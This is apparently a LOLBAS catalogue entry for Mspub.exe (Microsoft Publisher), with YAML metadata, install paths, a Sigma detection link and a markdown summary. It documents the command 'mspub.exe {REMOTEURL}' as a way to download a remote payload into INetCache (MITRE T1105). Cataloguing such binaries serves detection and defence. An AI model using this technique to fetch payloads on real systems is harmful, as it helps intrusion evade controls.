---
Author: Nir Chako
Commands:
- Category: Download
  Command: mspub.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2022-08-02
Description: Microsoft Publisher
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
- IOC: Suspicious Office application internet/network traf
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSPUB.exe
Name: Mspub.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# Mspub.exe

Microsoft Publisher

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office14\MSPUB.exe`

# Download Commands

Downloads payload from remote server

```batch
mspub.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Nir Chako (Authored, 2022-08-02)